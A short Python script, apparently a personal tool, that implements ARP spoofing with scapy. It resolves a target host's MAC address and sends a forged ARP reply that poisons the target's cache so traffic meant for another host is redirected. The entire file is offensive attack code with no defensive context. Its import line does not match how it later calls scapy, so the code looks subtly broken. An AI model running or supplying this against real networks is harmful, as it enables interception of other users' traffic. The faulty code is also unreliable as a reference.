import sys
from scapy import *

class ArpSpoofing:

    def __init__(self):
        pass

    def doSpoof(self, hostToAttack, hostToSpoof):

        def obtainMac(hostToAttack):
            arpReq = scapy.ARP(pdst=hostToAttack)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arpReqBroad = broadcast/arpReq
            result = scapy.srp(arpReqBroad, timeout=1,verbose=False)[0]

            return result[0][1].hwsrc

        print("spoof")

        targetMac = obtainMac(hostToAttack)
        #op = 2 means that it is a reply
        packet = scapy.ARP(op=2, pdst=hostToAttack, hwdst=targetMac, psrc=hostToSpoof)
        scapy.send(packet, verbose=False)
        print("Spoof Spoof")








